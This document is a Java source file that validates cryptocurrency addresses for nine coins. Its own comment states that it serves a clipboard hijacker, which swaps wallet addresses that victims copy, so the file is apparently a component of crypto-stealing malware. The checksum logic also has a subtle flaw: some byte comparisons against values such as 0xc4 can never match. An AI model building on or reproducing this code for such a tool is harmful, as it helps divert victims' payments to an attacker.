package com.spcagentpayloa.jvmxx;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Locale;

/**
 * Strict address validation. A checksum is not optional: the clipboard
 * hijacker must never replace a string that a wallet would reject.
 */
public final class AddressValidator {
	public static final String[] COINS = {"btc", "eth", "sol", "ltc", "doge", "bch", "trx", "xrp", "ada"};
	private static final String HEX = "0123456789abcdefABCDEF";
	private static final String CASH_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";

	private AddressValidator() {
	}

	public static boolean known(String coin) {
		for (String candidate : COINS) {
			if (candidate.equals(coin)) {
				return true;
			}
		}
		return false;
	}

	/** True when the coin is implemented and the full string passes its check. */
	public static boolean valid(String coin, String value) {
		if (coin == null || value == null || value.isEmpty() || value.length() > 128) {
			return false;
		}
		try {
			return switch (coin.toLowerCase(Locale.ROOT)) {
				case "btc" -> bitcoin(value);
				case "eth" -> ethereum(value);
				case "sol" -> solana(value);
				case "ltc" -> litecoin(value);
				case "doge" -> dogecoin(value);
				case "bch" -> bitcoincash(value);
				case "trx" -> tron(value);
				case "xrp" -> ripple(value);
				case "ada" -> cardano(value);
				default -> false;
			};
		} catch (Throwable throwable) {
			return false;
		}
	}

	/** True for the testnet form of a coin that has one. */
	public static boolean testnet(String coin, String value) {
		String lower = value.toLowerCase(Locale.ROOT);
		return switch (coin) {
			case "btc" -> lower.startsWith("tb1") || lower.startsWith("m") || lower.startsWith("n")
				|| lower.startsWith("2");
			case "ltc" -> lower.startsWith("tltc1") || value.startsWith("m") || value.startsWith("n")
				|| value.startsWith("2");
			case "bch" -> lower.startsWith("bchtest:");
			case "ada" -> lower.startsWith("addr_test");
			default -> false;
		};
	}

	/** Coin whose validator accepts this exact string, or "" for none. */
	public static String coinOf(String value, Iterable<String> enabled) {
		String text = value == null ? "" : value.trim();
		for (String coin : enabled) {
			if (valid(coin, text)) {
				return coin;
			}
		}
		return "";
	}

	private static boolean bitcoin(String value) {
		String lower = value.toLowerCase(Locale.ROOT);
		if (lower.startsWith("bc1") || lower.startsWith("tb1")) {
			Bech32.Decoded decoded = Bech32.decode(value);
			String hrp = decoded.hrp();
			if (!hrp.equals("bc") && !hrp.equals("tb")) {
				return false;
			}
			return witness(decoded);
		}
		if (value.charAt(0) != '1' && value.charAt(0) != '3' && value.charAt(0) != 'm'
			&& value.charAt(0) != 'n' && value.charAt(0) != '2') {
			return false;
		}
		byte[] payload = base58check(value);
		return payload.length == 21
			&& (payload[0] == 0x00 || payload[0] == 0x05 || payload[0] == 0x6f || payload[0] == 0xc4);
	}

	private static boolean ethereum(String value) {
		if (value.length() != 42 || !value.startsWith("0x")) {
			return false;
		}
		String hex = value.substring(2);
		for (int i = 0; i < hex.length(); i++) {
			if (HEX.indexOf(hex.charAt(i)) < 0) {
				return false;
			}
		}
		boolean lower = hex.equals(hex.toLowerCase(Locale.ROOT));
		boolean upper = hex.equals(hex.toUpperCase(Locale.ROOT));
		if (lower || upper) {
			return true;
		}
		String hash = bytesToHex(Keccak.hash(hex.toLowerCase(Locale.ROOT).getBytes(StandardCharsets.US_ASCII)));
		for (int i = 0; i < 40; i++) {
			char character = hex.charAt(i);
			char folded = Character.toLowerCase(character);
			if (folded < 'a' || folded > 'f') {
				continue;
			}
			boolean shouldUpper = Character.digit(hash.charAt(i), 16) >= 8;
			if (shouldUpper != Character.isUpperCase(character)) {
				return false;
			}
		}
		return true;
	}

	private static boolean solana(String value) {
		return value.length() >= 32 && value.length() <= 44 && Base58.decode(value).length == 32;
	}

	private static boolean litecoin(String value) {
		String lower = value.toLowerCase(Locale.ROOT);
		if (lower.startsWith("ltc1") || lower.startsWith("tltc1")) {
			Bech32.Decoded decoded = Bech32.decode(value);
			String hrp = decoded.hrp();
			return (hrp.equals("ltc") || hrp.equals("tltc")) && witness(decoded);
		}
		byte[] payload = base58check(value);
		return payload.length == 21 && (payload[0] == 0x30 || payload[0] == 0x32 || payload[0] == 0x05
			|| payload[0] == 0x6f || payload[0] == 0xc4);
	}

	private static boolean dogecoin(String value) {
		byte[] payload = base58check(value);
		return payload.length == 21 && (payload[0] == 0x1e || payload[0] == 0x16);
	}

	private static boolean bitcoincash(String value) {
		String lower = value.toLowerCase(Locale.ROOT);
		if (lower.startsWith("bitcoincash:") || lower.startsWith("bchtest:") || lower.startsWith("q")
			|| lower.startsWith("p")) {
			try {
				byte[] payload = cashaddr(lower);
				if (payload.length == 21 || payload.length == 33) {
					int version = payload[0] & 0xff;
					int type = (version >> 3) & 0x1f;
					int size = version & 7;
					return (version & 0x80) == 0 && type <= 1
						&& ((payload.length == 21 && size == 0) || (payload.length == 33 && size == 1));
				}
			} catch (Throwable ignored) {
				// Fall through to the legacy check.
			}
		}
		byte[] payload = base58check(value);
		return payload.length == 21 && (payload[0] == 0x00 || payload[0] == 0x05);
	}

	private static boolean tron(String value) {
		if (value.charAt(0) != 'T') {
			return false;
		}
		byte[] payload = base58check(value);
		return payload.length == 21 && payload[0] == 0x41;
	}

	private static boolean ripple(String value) {
		if (value.charAt(0) != 'r' || value.length() < 25 || value.length() > 35) {
			return false;
		}
		byte[] decoded = Base58.decodeRipple(value);
		if (decoded.length != 25) {
			return false;
		}
		byte[] payload = java.util.Arrays.copyOf(decoded, 21);
		byte[] checksum = java.util.Arrays.copyOfRange(decoded, 21, 25);
		if (!java.util.Arrays.equals(checksum, java.util.Arrays.copyOf(doubleSha256(payload), 4))) {
			throw new IllegalArgumentException("ripple checksum");
		}
		return payload[0] == 0x00;
	}

	private static boolean cardano(String value) {
		Bech32.Decoded decoded = Bech32.decode(value);
		if (!decoded.hrp().equals("addr") && !decoded.hrp().equals("addr_test")) {
			return false;
		}
		byte[] program = Bech32.payload(decoded);
		if (program.length != 29 && program.length != 57) {
			return false;
		}
		return (program[0] & 0xf0) >>> 4 <= 7;
	}

	private static boolean witness(Bech32.Decoded decoded) {
		if (decoded.words().length == 0) {
			return false;
		}
		int version = decoded.words()[0];
		if (version > 16) {
			return false;
		}
		byte[] program = Bech32.program(decoded);
		if (version == 0) {
			return !decoded.bech32m() && (program.length == 20 || program.length == 32);
		}
		return decoded.bech32m() && program.length >= 2 && program.length <= 40;
	}

	static byte[] base58check(String value) {
		byte[] decoded = Base58.decode(value);
		if (decoded.length < 5) {
			throw new IllegalArgumentException("short base58check");
		}
		byte[] payload = java.util.Arrays.copyOf(decoded, decoded.length - 4);
		byte[] checksum = java.util.Arrays.copyOfRange(decoded, decoded.length - 4, decoded.length);
		byte[] expected = doubleSha256(payload);
		if (!java.util.Arrays.equals(checksum, java.util.Arrays.copyOf(expected, 4))) {
			throw new IllegalArgumentException("checksum");
		}
		return payload;
	}

	private static byte[] cashaddr(String value) {
		String text = value;
		String prefix = "bitcoincash";
		int separator = text.lastIndexOf(':');
		if (separator >= 0) {
			prefix = text.substring(0, separator);
			text = text.substring(separator + 1);
		}
		if (text.length() < 8) {
			throw new IllegalArgumentException("cashaddr length");
		}
		byte[] payload = new byte[text.length()];
		for (int i = 0; i < text.length(); i++) {
			int digit = CASH_CHARSET.indexOf(text.charAt(i));
			if (digit < 0) {
				throw new IllegalArgumentException("cashaddr charset");
			}
			payload[i] = (byte) digit;
		}
		long checksum = 1L;
		for (int i = 0; i < prefix.length(); i++) {
			checksum = cashStep(checksum, prefix.charAt(i) & 0x1f);
		}
		checksum = cashStep(checksum, 0);
		for (byte digit : payload) {
			checksum = cashStep(checksum, digit & 0xff);
		}
		if (checksum != 1L) {
			throw new IllegalArgumentException("cashaddr checksum");
		}
		int[] words = new int[payload.length - 8];
		for (int i = 0; i < words.length; i++) {
			words[i] = payload[i];
		}
		return fromWords(words);
	}

	private static long cashStep(long checksum, int value) {
		long top = checksum >>> 35;
		checksum = ((checksum & 0x07ffffffffL) << 5) ^ value;
		long[] generator = {0x98f2bc8e61L, 0x79b76d99e2L, 0xf33e5fb3c4L, 0xae2eabe2a8L, 0x1e4f43e470L};
		for (int i = 0; i < generator.length; i++) {
			if (((top >>> i) & 1L) != 0L) {
				checksum ^= generator[i];
			}
		}
		return checksum;
	}

	private static byte[] fromWords(int[] words) {
		int accumulator = 0;
		int bits = 0;
		java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
		for (int word : words) {
			accumulator = (accumulator << 5) | word;
			bits += 5;
			if (bits >= 8) {
				bits -= 8;
				out.write((accumulator >> bits) & 0xff);
			}
		}
		return out.toByteArray();
	}

	private static byte[] doubleSha256(byte[] input) {
		MessageDigest digest = sha256();
		return digest.digest(digest.digest(input));
	}

	private static MessageDigest sha256() {
		try {
			return MessageDigest.getInstance("SHA-256");
		} catch (java.security.NoSuchAlgorithmException exception) {
			throw new IllegalStateException(exception);
		}
	}

	private static String bytesToHex(byte[] data) {
		StringBuilder builder = new StringBuilder(data.length * 2);
		for (byte value : data) {
			builder.append(Character.forDigit((value >>> 4) & 0xf, 16));
			builder.append(Character.forDigit(value & 0xf, 16));
		}
		return builder.toString();
	}
}
